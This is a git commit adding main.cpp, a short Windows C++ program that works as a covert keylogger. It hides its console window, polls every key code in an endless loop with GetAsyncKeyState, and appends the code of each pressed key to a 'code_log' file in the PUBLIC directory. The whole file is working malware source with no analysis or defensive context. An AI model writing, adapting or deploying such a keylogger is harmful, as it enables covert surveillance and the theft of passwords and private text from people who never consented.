339e1459107fbd546318517e4afd7e10e3dacd18
Hundtro <dhund@protonmail.com>
2017-09-08 10:51:12 +0200

    Create main.cpp

---
+++ main.cpp
@@ -0,0 +1,46 @@
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow)
+{
+    ShowWindow( GetConsoleWindow(), SW_HIDE );
+
+    int state;
+    std::string ss;
+    std::string enc_log;
+    std::ofstream file;
+
+    if(const char* public_var = std::getenv("PUBLIC"))
+    {
+        enc_log  = public_var;
+        enc_log += "\\code_log";
+    }
+    else
+    {
+        return 1;
+    }
+
+    while (true)
+    {
+        Sleep(1);
+
+        for (int i = 0; i < 255; i++)
+        {
+            state = GetAsyncKeyState(i);
+
+            if (state == 1 || state == -32767)
+            {
+                ss = std::to_string(i);
+
+                file.open(enc_log, std::ios::app);
+
+                file << ss << ".";
+
+                file.flush();
+
+                file.close();
+            }
+        }
+    }
+}
